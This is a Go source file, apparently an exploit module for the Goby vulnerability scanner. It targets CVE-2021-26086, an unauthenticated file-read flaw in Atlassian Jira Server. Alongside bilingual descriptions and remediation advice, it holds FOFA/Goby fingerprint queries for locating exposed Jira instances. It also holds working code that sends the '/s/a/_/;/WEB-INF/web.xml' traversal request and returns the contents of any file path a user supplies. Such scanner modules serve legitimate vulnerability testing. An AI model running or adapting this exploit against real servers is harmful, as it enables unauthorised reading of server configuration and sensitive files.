package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Atlassian Jira Server File Read (CVE-2021-26086)",
    "Description": "<p>Atlassian JIRA Server is a server version of a defect tracking management system of Atlassian, Australia.</p><p>Atlassian JIRA Server has a file reading vulnerability. Attackers can use this vulnerability to construct malicious data to execute file reading attacks without authorization, and eventually cause partial file information leakage on the server.</p>",
    "Impact": "Atlassian Jira Server File Read (CVE-2021-26086)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.atlassian.com/software/jira/download-journey\">https://www.atlassian.com/software/jira/download-journey</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "JIRA",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Atlassian Jira Server 文件读取漏洞（CVE-2021-26086）",
            "Description": "<p>Atlassian JIRA Server是澳大利亚Atlassian公司的一套缺陷跟踪管理系统的服务器版本。该系统主要用于跟踪管理工作中各类问题。</p><p>Atlassian JIRA Server存在文件读取漏洞，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行文件读取攻击，最终造成服务器部分文件信息泄露。</p>",
            "Impact": "<p>Atlassian JIRA Server存在文件读取漏洞，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行文件读取攻击，最终造成服务器部分文件信息泄露。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.atlassian.com/software/jira/download-journey\" rel=\"nofollow\">https://www.atlassian.com/software/jira/download-journey</a></p><p>1、如⾮必要，禁⽌公⽹访问该系统。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
            "Product": "ATLASSIAN-JIRA",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Atlassian Jira Server File Read (CVE-2021-26086)",
            "Description": "<p>Atlassian JIRA Server is a server version of a defect tracking management system of Atlassian, Australia.</p><p>Atlassian JIRA Server has a file reading vulnerability. Attackers can use this vulnerability to construct malicious data to execute file reading attacks without authorization, and eventually cause partial file information leakage on the server.</p>",
            "Impact": "Atlassian Jira Server File Read (CVE-2021-26086)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.atlassian.com/software/jira/download-journey\" rel=\"nofollow\">https://www.atlassian.com/software/jira/download-journey</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "JIRA",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" &&  header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\")",
    "GobyQuery": "(body=\"jira.webresources\" || header=\"atlassian.xsrf.token\" || body=\"ams-build-number\" || title=\"System Dashboard - \" || (body=\"content=\\\"JIRA\" &&  header!=\"boa\" && body!=\"Server: Boa\") || banner=\"atlassian.xsrf.token\")",
    "Author": "featherstark@outlook.com",
    "Homepage": "https://www.atlassian.com/software/jira/",
    "DisclosureDate": "2021-09-01",
    "References": [
        "https://jira.atlassian.com/browse/JRASERVER-72695"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.3",
    "CVEIDs": [
        "CVE-2021-26086"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "ATLASSIAN-JIRA"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10230"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/s/a/_/;/WEB-INF/web.xml")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "display-name") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cfg := httpclient.NewGetRequestConfig("/s/a/_/;" + cmd)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
